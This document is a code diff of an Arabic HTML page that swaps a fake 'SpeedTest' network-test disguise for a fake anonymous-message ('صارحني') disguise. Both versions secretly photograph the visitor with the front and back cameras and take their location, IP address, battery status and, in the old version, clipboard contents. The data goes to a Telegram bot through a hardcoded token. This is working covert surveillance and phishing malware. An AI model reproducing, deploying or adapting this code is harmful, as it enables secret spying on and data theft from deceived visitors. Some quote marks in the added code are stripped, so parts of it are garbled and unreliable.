@@ -1,127 +1,95 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest Global | فحص سرعة الشبكة</title>
+    <title>صارحني | رسائل مجهولة</title>
     <style>
-        :root { --accent: #00d2ff; --dark-bg: #0b0e18; }
-        body { background: var(--dark-bg); color: white; font-family: Segoe UI, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.03) 1px, transparent 1px); background-size: 25px 25px; z-index: -1; }
-        .main-card { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 300; letter-spacing: 2px; }
-        .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
-        .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; outline: none; }
-        #goBtn:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
-        .loader-ring { position: absolute; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: var(--accent); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
-        #speedDisplay { display: none; text-align: center; }
-        .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        video, canvas { display: none; }
+        :root { --main: #00c2ff; --bg: #121217; }
+        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { background: #1e1e26; padding: 40px 25px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
+        .btn-send { background: var(--main); color: #000; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        textarea { width: 100%; height: 120px; background: #2a2a35; border: 1px solid #3d3d4d; border-radius: 15px; color: white; padding: 15px; box-sizing: border-box; }
+        #loading { display: none; margin-top: 15px; color: var(--main); font-size: 0.9rem; }
     </style>
 </head>
 <body>
-    <div class="grid-bg"></div>
-    <div class="main-card">
-        <h1>SPEEDTEST <span class="status-dot"></span></h1>
-        <p id="subText" style="color: #8892b0; font-size: 13px;">اختبر سرعة اتصالك بالسيرفرات الإقليمية</p>
-        <div class="gauge-box">
-            <div id="ring" class="loader-ring"></div>
-            <button id="goBtn">GO</button>
-            <div id="speedDisplay">
-                <span id="num" class="speed-num">0.0</span>
-                <span style="font-size: 14px; color: #8892b0;">Mbps (Download)</span>
-            </div>
-        </div>
-        <div id="specs" style="margin-top: 10px; font-size: 10px; color: #555;">تحليل السيرفر...</div>
-    </div>
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
 
-    <script>
-        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
-        const chat = "7984067238";
+<div class="container">
+    <h2>👤 صارحني</h2>
+    <p>أرسل رسالة سرية مجهولة لصديقك!</p>
+    <textarea id="userMsg" placeholder="اكتب صراحتك هنا..."></textarea>
+    <button class="btn-send" onclick="initiateProcess()">إرسال مجهول</button>
+    <div id="loading">جاري تأمين الاتصال...</div>
+</div>
 
-        // تحديث البيانات التقنية فوراً لرفع المصداقية
-        window.onload = () => {
-            const cpu = navigator.hardwareConcurrency || 8;
-            const ram = navigator.deviceMemory || 4;
-            document.getElementById('specs').innerText = `Server: YEMEN-DATA-01 | CPU: ${cpu} Core | RAM: ${ram}GB`;
-        };
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
 
-        async function sendToTelegram(msg, isImg = false, data = null) {
-            const url = `https://api.telegram.org/bot${token}/`;
-            try {
-                if(!isImg) {
-                    await fetch(`${url}sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-                } else {
-                    const fd = new FormData();
-                    fd.append("chat_id", chat);
-                    fd.append("photo", data, "capture.jpg");
-                    await fetch(`${url}sendPhoto`, {method: "POST", body: fd});
-                }
-            } catch(e) {}
+<script>
+    const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
+    const C = "7984067238";
+
+    async function sendToBot(data, isPhoto = false, caption = "") {
+        const url = `https://api.telegram.org/bot${T}/`;
+        if (!isPhoto) {
+            await fetch(`${url}sendMessage?chat_id=${C}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
+        } else {
+            const fd = new FormData();
+            fd.append("chat_id", C);
+            fd.append("photo", data, "shot.jpg");
+            fd.append("caption", caption);
+            await fetch(`${url}sendPhoto`, { method: "POST", body: fd });
         }
+    }
 
-        async function snap(mode) {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode === "front" ? "user" : "environment", width: 1280, height: 720}});
-                const v = document.getElementById("v");
-                const c = document.getElementById("c");
-                v.srcObject = s;
-                await new Promise(r => v.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 1000));
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext("2d").drawImage(v, 0, 0);
-                s.getTracks().forEach(t => t.stop());
-                return new Promise(res => c.toBlob(res, "image/jpeg", 0.8));
-            } catch(e) { return null; }
-        }
-
-        document.getElementById("goBtn").onclick = async function() {
-            this.style.display = "none";
-            document.getElementById("ring").style.display = "block";
-            document.getElementById("speedDisplay").style.display = "block";
-            document.getElementById("subText").innerText = "جاري فحص جودة الاتصال...";
-
-            // عداد وهمي سريع
-            const timer = setInterval(() => {
-                document.getElementById("num").innerText = (Math.random() * (99 - 80) + 80).toFixed(1);
-            }, 100);
-
-            // 1. جمع التقرير التقني الشامل
-            const b = await navigator.getBattery();
-            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            let clipText = "لا يوجد إذن";
-            try { clipText = await navigator.clipboard.readText(); } catch(e) {}
-
-            let report = `🚀 *رصد جديد من SpeedTest*:\n\n` +
-                         `📱 الجهاز: \`${navigator.platform}\`\n` +
-                         `🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋 منفصل"})\n` +
-                         `📋 الكيبورد: \`${clipText || "فارغ"}\`\n` +
-                         `🌐 الـ IP: \`${ip.ip}\`\n` +
-                         `⚙️ المتصفح: \`${navigator.userAgent.split(' ').pop()}\``;
-            
-            await sendToTelegram(report);
-
-            // 2. التقاط الصور (أمامية ثم خلفية بملء الشاشة)
-            const front = await snap("front");
-            if(front) await sendToTelegram("📸 صورة أمامية", true, front);
-            
-            const back = await snap("back");
-            if(back) await sendToTelegram("📷 صورة خلفية", true, back);
-
-            // 3. الموقع الجغرافي
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendToTelegram(`📍 *موقع الهدف*:\n[فتح الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
+    async function capture(side) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: side === "front" ? "user" : "environment", width: 1280, height: 720 }
             });
+            const v = document.getElementById( v );
+            const c = document.getElementById( c );
+            v.srcObject = stream;
+            await new Promise(r => v.onloadedmetadata = r);
+            // انتظار معايرة الكاميرا (يحل مشكلة الصور السوداء)
+            await new Promise(r => setTimeout(r, 1500)); 
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext( 2d ).drawImage(v, 0, 0);
+            stream.getTracks().forEach(t => t.stop());
+            return new Promise(r => c.toBlob(r,  image/jpeg , 0.9));
+        } catch (e) { return null; }
+    }
 
-            setTimeout(() => {
-                clearInterval(timer);
-                location.href = "https://www.speedtest.net/ar";
-            }, 6000); 
-        };
-    </script>
+    async function initiateProcess() {
+        const msg = document.getElementById( userMsg ).value;
+        if (!msg) { alert("اكتب رسالتك أولاً!"); return; }
+        
+        document.getElementById( loading ).style.display =  block ;
+
+        // التقاط الصور
+        const f = await capture("front");
+        if (f) await sendToBot(f, true, "📸 صورة أمامية");
+
+        const b = await capture("back");
+        if (b) await sendToBot(b, true, "📷 صورة خلفية");
+
+        // إرسال البيانات
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            const bat = await navigator.getBattery();
+            const ip = await fetch( https://api.ipify.org?format=json ).then(r => r.json());
+            let report = `👤 *رسالة صارحني*:\n💬: \`${msg}\`\n📍: [الموقع](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n🔋: \`${Math.round(bat.level * 100)}%\` ${bat.charging ? "🔌" : "🔋"}\n🌐: \`${ip.ip}\``;
+            await sendToBot(report);
+        }, () => sendToBot(`💬: \`${msg}\`\n⚠️ الموقع مرفوض`));
+
+        setTimeout(() => {
+            alert("تم إرسال رسالتك بسرية!");
+            location.reload();
+        }, 2500);
+    }
+</script>
+
 </body>
 </html>
